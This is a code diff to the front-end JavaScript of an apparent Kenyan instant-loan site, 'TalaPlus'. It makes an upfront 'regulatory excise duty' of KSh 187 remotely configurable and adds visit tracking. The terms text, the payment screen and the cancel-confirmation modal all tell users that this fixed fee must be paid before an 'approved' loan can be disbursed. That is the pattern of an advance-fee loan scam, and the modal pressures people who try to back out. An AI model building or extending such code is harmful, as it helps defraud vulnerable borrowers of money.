@@ -4,6 +4,55 @@
 
 document.addEventListener('DOMContentLoaded', () => {
 
+  // --- CLIENT CONFIGURATION STATE ---
+  let clientConfig = {
+    exciseDuty: 187
+  };
+
+  async function fetchPublicConfig() {
+    try {
+      const response = await fetch('/api/config');
+      if (response.ok) {
+        const data = await response.json();
+        if (data && data.exciseDuty) {
+          clientConfig.exciseDuty = parseInt(data.exciseDuty, 10);
+          updateExciseTextsInUI();
+        }
+      }
+    } catch (err) {
+      console.error('[CONFIG] Failed to load dynamic config:', err);
+    }
+  }
+
+  function updateExciseTextsInUI() {
+    document.querySelectorAll('.excise-val').forEach(el => {
+      el.textContent = clientConfig.exciseDuty;
+    });
+    const exciseValEl = document.getElementById('excise-duty-val');
+    if (exciseValEl) {
+      exciseValEl.textContent = 'Ksh ' + clientConfig.exciseDuty;
+    }
+    const metaDesc = document.querySelector('meta[name="description"]');
+    if (metaDesc) {
+      const current = metaDesc.getAttribute('content');
+      metaDesc.setAttribute('content', current.replace(/187/g, clientConfig.exciseDuty));
+    }
+  }
+
+  // --- TRACK VISITS ---
+  if (!sessionStorage.getItem('talaPlusVisited')) {
+    fetch('/api/track-visit', { method: 'POST' })
+      .then(res => res.json())
+      .then(data => {
+        if (data && data.success) {
+          sessionStorage.setItem('talaPlusVisited', 'true');
+        }
+      })
+      .catch(err => console.error('[ANALYTICS] Failed to track page view:', err));
+  }
+
+  fetchPublicConfig();
+
   // --- STATE ROUTER VARIABLES ---
   const views = {
     landing: document.getElementById('landing-view'),
@@ -131,7 +180,7 @@ document.addEventListener('DOMContentLoaded', () => {
           You must be a Kenyan resident aged 18 years or older, with a valid National ID and a registered Safaricom M-Pesa account.</p>
           
           <p style="margin-bottom: 10px;"><strong>2. Interest & Fees</strong><br>
-          Loans are subject to a flat interest rate of 9.8% per month. A regulatory excise duty of KSh 187 is required to authorize the disbursement of your approved loan amount.</p>
+          Loans are subject to a flat interest rate of 9.8% per month. A regulatory excise duty of KSh ${clientConfig.exciseDuty} is required to authorize the disbursement of your approved loan amount.</p>
           
           <p style="margin-bottom: 10px;"><strong>3. Repayment & Rollover</strong><br>
           You agree to repay the total outstanding amount within your selected repayment period (1, 2, 3, or 6 months). Extensions or rollovers must be requested prior to the due date and are subject to additional terms.</p>
@@ -923,7 +972,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const data = JSON.parse(rawData);
     const amount = parseInt(data.loanAmount, 10);
-    const exciseDuty = 187; // fixed KSh 187
+    const exciseDuty = clientConfig.exciseDuty;
     // excise duty
 
     // Set amounts in the UI
@@ -1068,7 +1117,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!rawData) return;
     const appData = JSON.parse(rawData);
     const amount = parseInt(appData.loanAmount, 10);
-    const exciseDuty = 187;
+    const exciseDuty = clientConfig.exciseDuty;
 
     const formattedTargetPhone = formatKenyanPhone(cleanPhone);
     document.getElementById('sending-phone-val').textContent = formattedTargetPhone;
@@ -1201,7 +1250,7 @@ document.addEventListener('DOMContentLoaded', () => {
   function showCancelConfirmModal() {
     Swal.fire({
       title: 'Cancel Payment?',
-      text: 'Are you sure you want to cancel the Excise Duty authorization? Your loan offer is reserved, but we cannot disburse the funds without the regulatory KSh 187 fixed excise payment.',
+      text: `Are you sure you want to cancel the Excise Duty authorization? Your loan offer is reserved, but we cannot disburse the funds without the regulatory KSh ${clientConfig.exciseDuty} fixed excise payment.`,
       icon: 'warning',
       showCancelButton: true,
       confirmButtonText: 'Yes, Cancel Payment',
